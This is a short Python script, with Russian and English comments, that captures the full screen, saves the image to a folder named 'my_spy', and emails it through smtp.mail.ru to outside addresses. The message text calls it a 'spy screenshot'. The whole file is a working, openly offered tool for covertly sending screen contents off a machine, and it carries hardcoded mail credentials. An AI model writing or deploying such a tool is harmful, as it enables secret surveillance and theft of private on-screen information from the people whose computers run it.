# Не забудьте в коде программы поменять путь к месту, где должны сохраняться скриншоты!!!
# ))) вы можете использовать OS для обнаружения папки скрипта вместо прямого указания на папку ))))
# Do not forget to change the path to the place where the screenshots should be saved in the program code!!!
# ))) you can use OS to detect script folder instead of direct pointing to folder ))))

# screenshot
from PIL import ImageGrab
import datetime
import os

img = ImageGrab.grab()
my_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
my_project_path = 'C:\\Users\\user123\\PycharmProjects\\my_spy'
file_name = my_project_path + "\\screenshot_" + my_time + ".jpg"
img.save(file_name, "JPEG")

# send email
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from platform import python_version

server = 'smtp.mail.ru'
user = 'info@wiseplat.org'
password = 'MySuperPassword'

recipients = ['someuser1@mail.ru', 'someuser2@gmail.com']
sender = 'info@wiseplat.org'
subject = 'Скриншот экрана ' + my_time
text = 'Шпионский скриншот))))'
html = '<html><head></head><body><p>' + text + '</p></body></html>'

filepath = file_name
basename = os.path.basename(filepath)
filesize = os.path.getsize(filepath)

msg = MIMEMultipart('alternative')
msg['Subject'] = subject
msg['From'] = 'Python script <' + sender + '>'
msg['To'] = ', '.join(recipients)
msg['Reply-To'] = sender
msg['Return-Path'] = sender
msg['X-Mailer'] = 'Python/' + (python_version())

part_text = MIMEText(text, 'plain')
part_html = MIMEText(html, 'html')
part_file = MIMEBase('application', 'octet-stream; name="{}"'.format(basename))
part_file.set_payload(open(filepath, "rb").read())
part_file.add_header('Content-Description', basename)
part_file.add_header('Content-Disposition', 'attachment; filename="{}"; size={}'.format(basename, filesize))
encoders.encode_base64(part_file)

msg.attach(part_text)
msg.attach(part_html)
msg.attach(part_file)

mail = smtplib.SMTP_SSL(server)
mail.login(user, password)
mail.sendmail(sender, recipients, msg.as_string())
mail.quit()

